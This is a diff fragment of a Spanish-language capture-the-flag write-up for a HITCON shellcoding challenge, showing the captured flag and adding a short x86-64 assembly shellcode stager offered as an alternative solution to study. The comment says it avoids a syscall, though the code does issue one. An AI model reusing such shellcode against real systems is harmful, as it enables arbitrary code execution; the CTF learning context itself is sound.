@@ -301,3 +301,26 @@ Y por fin, la ansiada flag:
 ```
 hitcon{sh3llc0d1n9_1s_4_b4by_ch4ll3n93_4u}
 ```
+
+Otra solución a estudiar para ver que hace exactamente porque no utiliza llamada a syscall:
+
+```asm
+;BITS64
+global _start
+
+section .text
+
+_start:
+
+add r9w, 0x8285
+mov dl, 100
+lea rsi, [rel $ -0x010503]
+;lea rsi, [rip - 0x010503]
+
+loop:
+add rsi, r9
+xor eax, eax
+syscall
+jmp loop
+```
+
